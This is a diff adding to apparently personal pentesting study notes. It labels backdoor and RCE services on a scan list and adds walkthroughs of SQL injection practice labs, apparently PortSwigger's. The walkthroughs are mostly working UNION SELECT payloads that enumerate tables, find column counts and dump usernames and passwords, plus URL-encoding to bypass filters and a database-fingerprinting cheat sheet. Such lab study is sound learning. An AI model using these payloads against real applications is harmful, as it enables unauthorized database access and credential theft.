@@ -350,8 +350,8 @@ Port 5432 PostgreSQL  8.3.0               HIGH
 Port 5900 VNC         protocol 3.3        HIGH
 Port 6667 IRC         UnrealIRCd          CRITICAL
 Port 8180 Tomcat      Apache Tomcat       HIGH
-Port 8787  TCP — unknown 
-Port 3632  TCP — distccd  
+Port 8787  Metasploit    backdoor listener   CRITICAL
+Port 3632  distccd       compiler daemon RCE HIGH
  
 
 ======================================================
@@ -481,6 +481,64 @@ methodology:
 4. list columns: ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='target_table'--
 5. dump data: ' UNION SELECT username_col,password_col FROM target_table--
 6. login with extracted credentials
+
+Lab 06 — Oracle database contents extraction — DONE
+same as Lab 05 but Oracle syntax
+list tables:   ' UNION SELECT table_name,NULL FROM all_tables--
+list columns:  ' UNION SELECT column_name,NULL FROM all_columns
+               WHERE table_name='USERS_KHBIUX'--
+dump data:     ' UNION SELECT USERNAME_KSLLLN,PASSWORD_SAGGFL
+               FROM USERS_KHBIUX--
+note: Oracle uses all_tables and all_columns not information_schema
+
+Lab 07 — Finding column count with NULL — DONE
+goal: find number of columns using UNION SELECT NULL
+method: add NULLs one at a time until page loads without error
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL-- ← page loaded = 3 columns
+
+Lab 08 — Finding text columns — DONE
+goal: find which column accepts string data
+method: replace each NULL with a string one at a time
+' UNION SELECT 'test',NULL,NULL--
+' UNION SELECT NULL,'test',NULL--
+' UNION SELECT NULL,NULL,'test'--
+whichever loads without error = that column accepts strings
+
+Lab 09 — Retrieving data from other tables — DONE
+goal: dump username and password from users table
+payload: ' UNION SELECT username,password FROM users--
+URL encoded: %27%20UNION%20SELECT%20username,password%20FROM%20users--
+note: URL encoding bypasses some filters and browser restrictions
+
+Lab 10 — Retrieving multiple values in single column — DONE
+goal: dump two values when only one column accepts strings
+technique: CONCAT combines multiple values into one string
+payload: ' UNION SELECT NULL,CONCAT(username,password) FROM users--
+better:  ' UNION SELECT NULL,CONCAT(username,':',password) FROM users--
+why better: separator makes splitting username from password easy
+PostgreSQL alternative: username||':'||password (double pipe)
+
+
+DATABASE VERSION QUERIES — CHEAT SHEET
+Oracle:     SELECT banner FROM v$version
+MySQL:      SELECT @@version
+PostgreSQL: SELECT version()
+MSSQL:      SELECT @@version
+
+IDENTIFY DATABASE TYPE
+Oracle:     FROM dual works in query
+MySQL:      # works as comment, VERSION() works
+PostgreSQL: SELECT version() works
+MSSQL:      SELECT @@version works
+
+URL ENCODING — use when browser blocks special characters
+'  = %27
+space = %20
+example: %27%20UNION%20SELECT...
+
+REFERENCE: portswigger.net/web-security/sql-injection/cheat-sheet
 
 information_schema — built-in database map (not Oracle)
 information_schema.tables  — all table names
